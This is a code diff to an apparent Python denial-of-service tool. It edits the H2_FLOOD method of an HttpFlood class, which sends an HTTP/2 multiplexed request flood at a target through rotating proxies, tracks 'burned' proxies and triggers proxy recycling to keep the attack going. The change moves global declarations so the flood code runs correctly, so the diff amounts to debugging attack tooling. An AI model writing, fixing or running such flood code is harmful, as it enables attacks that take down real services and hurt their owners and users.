@@ -1570,6 +1570,8 @@ class HttpFlood(Thread):
 
     def H2_FLOOD(self):
         # [PHASE 5 & 10] HTTP/2 Multiplexing Flood (Optimized Client)
+        global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND, TOTAL_REQUESTS_SENT, RECYCLE_EVENT, IS_RECYCLING
+        
         path = self.get_random_target_path()
         ua = randchoice(self._useragents)
         
@@ -1589,7 +1591,6 @@ class HttpFlood(Thread):
                     break
             else:
                 # [PHASE 13] Trigger recycle if all proxies are burned
-                global RECYCLE_EVENT, IS_RECYCLING
                 if not IS_RECYCLING:
                     RECYCLE_EVENT.set()
                 sleep(2)
@@ -1618,7 +1619,6 @@ class HttpFlood(Thread):
             # We use a smaller internal loop to report back more frequently
             for _ in range(5): 
                 with client.stream("GET", f"{self._target.scheme}://{self._target.authority}{path}") as resp:
-                    global CONNECTIONS_SENT, REQUESTS_SENT, BYTES_SEND, TOTAL_REQUESTS_SENT
                     CONNECTIONS_SENT += 1
                     REQUESTS_SENT += 1
                     TOTAL_REQUESTS_SENT += 1
@@ -1634,7 +1634,6 @@ class HttpFlood(Thread):
                 
                 # [PHASE 13] Check if recycle target reached
                 if len(BURNED_PROXIES) > len(self._proxies) * 0.8:
-                    global RECYCLE_EVENT, IS_RECYCLING
                     if not IS_RECYCLING:
                         RECYCLE_EVENT.set()
         except Exception:
